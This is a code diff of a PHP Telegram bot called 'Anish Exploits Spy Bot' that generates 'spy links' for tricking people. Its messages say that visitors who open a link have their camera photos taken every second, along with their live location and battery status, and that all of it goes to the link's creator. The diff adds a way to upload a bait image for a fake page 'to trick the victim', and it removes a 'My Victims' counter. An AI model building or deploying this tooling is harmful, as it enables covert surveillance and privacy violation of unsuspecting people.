@@ -4,85 +4,92 @@ require_once 'config.php';
 $botToken = $config['bot_token'];
 $website = $config['website'];
 
-// Create files if not exist
-if (!file_exists("links.json")) {
-    file_put_contents("links.json", json_encode([]));
-}
-
 $content = file_get_contents("php://input");
 $update = json_decode($content, true);
 
-if (!$update) exit;
+if (!$update) {
+    exit;
+}
 
-$chatId = $update["message"]["chat"]["id"] ?? null;
+$chatId = $update["message"]["chat"]["id"] ?? $update["callback_query"]["message"]["chat"]["id"] ?? null;
 $text = $update["message"]["text"] ?? "";
+$photo = $update["message"]["photo"] ?? null;
 $callback = $update["callback_query"] ?? null;
 
-// /start
+// Handle /start
 if ($text == "/start") {
     $keyboard = [
         "inline_keyboard" => [
-            [["text" => "🔗 Generate Spy Link", "callback_data" => "generate"]],
-            [["text" => "📊 My Victims", "callback_data" => "stats"]]
+            [["text" => "📸 Create Custom Photo Spy Link", "callback_data" => "ask_photo"]],
+            [["text" => "🔗 Create Normal Link", "callback_data" => "ask_url"]]
         ]
     ];
-    sendMessage($chatId, "👾 *Anish Exploits Spy Bot*\n\nSend any URL, I'll make a spy link.\nWhen someone clicks it, auto-capture starts! 📸", json_encode($keyboard));
+    sendTelegramMessage($botToken, $chatId, "👾 *Anish Exploits Spy Bot*\n\nChoose an option below to generate your tracking link:", json_encode($keyboard));
 }
 
-// Generate button
-if ($callback && $callback["data"] == "generate") {
-    sendMessage($callback["from"]["id"], "📥 *Send target URL*\nExample: `https://youtube.com`");
-    answerCallback($callback["id"]);
+// User clicked Custom Photo Link
+if ($callback && $callback["data"] == "ask_photo") {
+    // Save state that user is waiting to send a photo
+    file_put_contents("state_$chatId.txt", "waiting_photo");
+    sendTelegramMessage($botToken, $chatId, "📥 *Send a target photo (banner/image)*\nThis image will be shown on the fake website to trick the victim.");
+    answerCallback($botToken, $callback["id"]);
 }
 
-// Stats button
-if ($callback && $callback["data"] == "stats") {
-    $allVisitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
-    $myVisitors = [];
-    
-    foreach ($allVisitors as $id => $data) {
-        if (isset($data['generated_by']) && $data['generated_by'] == $callback["from"]["id"]) {
-            $myVisitors[] = $data;
+// User sent a Photo for custom link
+if ($photo) {
+    $stateFile = "state_$chatId.txt";
+    if (file_exists($stateFile) && file_get_contents($stateFile) == "waiting_photo") {
+        unlink($stateFile); // clear state
+        
+        // Get highest resolution photo
+        $fileId = end($photo)['file_id'];
+        
+        // Get file path from Telegram
+        $fileInfo = json_decode(file_get_contents("https://api.telegram.org/bot$botToken/getFile?file_id=$fileId"), true);
+        $filePath = $fileInfo['result']['file_path'];
+        $fileUrl = "https://api.telegram.org/file/bot$botToken/" . $filePath;
+        
+        // Save image locally in uploads folder
+        if (!is_dir("uploads")) {
+            mkdir("uploads", 0777, true);
         }
+        $targetImageName = "target_" . $chatId . "_" . time() . ".jpg";
+        copy($fileUrl, "uploads/" . $targetImageName);
+        
+        // Generate shortcode
+        $shortCode = 'custom_' . substr(time(), -5);
+        $dbFile = "links.json";
+        $db = file_exists($dbFile) ? json_decode(file_get_contents($dbFile), true) : [];
+        $db[$shortCode] = [
+            'type' => 'photo',
+            'image' => "uploads/" . $targetImageName,
+            'created_by' => $chatId,
+            'created_at' => date('Y-m-d H:i:s')
+        ];
+        file_put_contents($dbFile, json_encode($db));
+        
+        $spyLink = $website . "/?id=" . $shortCode;
+        sendTelegramMessage($botToken, $chatId, "✅ *Custom Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When the victim opens this, your uploaded photo will be displayed, and their camera will be captured!");
     }
-    
-    $total = count($myVisitors);
-    sendMessage($callback["from"]["id"], "📊 *Your Victims:* $total\n\n🔗 Generate more links to track more people!");
-    answerCallback($callback["id"]);
 }
 
-// User sends URL - Convert to spy link
-if ($text && filter_var($text, FILTER_VALIDATE_URL)) {
-    // Extract domain name from URL for short code
-    $parsed = parse_url($text);
-    $domain = str_replace(['www.', '.'], ['', '_'], $parsed['host'] ?? 'link');
-    $shortCode = $domain . '_' . substr(time(), -4);
-    
-    // Save target URL with user's chat ID
-    $db = json_decode(file_get_contents("links.json"), true) ?? [];
-    $db[$shortCode] = [
-        'url' => $text,
-        'created_by' => $chatId,
-        'created_at' => date('Y-m-d H:i:s')
-    ];
-    file_put_contents("links.json", json_encode($db));
-    
-    $spyLink = $website . $shortCode;
-    
-    sendMessage($chatId, "✅ *Spy Link Generated!*\n\n🔗 `$spyLink`\n\n📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n*All photos will come to YOU!*");
-}
-
-function sendMessage($chatId, $text, $replyMarkup = null) {
-    global $botToken;
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+function sendTelegramMessage($token, $chatId, $text, $replyMarkup = null) {
+    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
     $data = ["chat_id" => $chatId, "text" => $text, "parse_mode" => "Markdown"];
     if ($replyMarkup) $data['reply_markup'] = $replyMarkup;
-    file_get_contents($url . "?" . http_build_query($data));
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_exec($ch);
+    curl_close($ch);
 }
 
-function answerCallback($id) {
-    global $botToken;
-    $url = "https://api.telegram.org/bot$botToken/answerCallbackQuery";
-    file_get_contents($url . "?callback_query_id=" . $id);
+function answerCallback($token, $id) {
+    $url = "https://api.telegram.org/bot" . $token . "/answerCallbackQuery";
+    @file_get_contents($url . "?callback_query_id=" . $id);
 }
 ?>
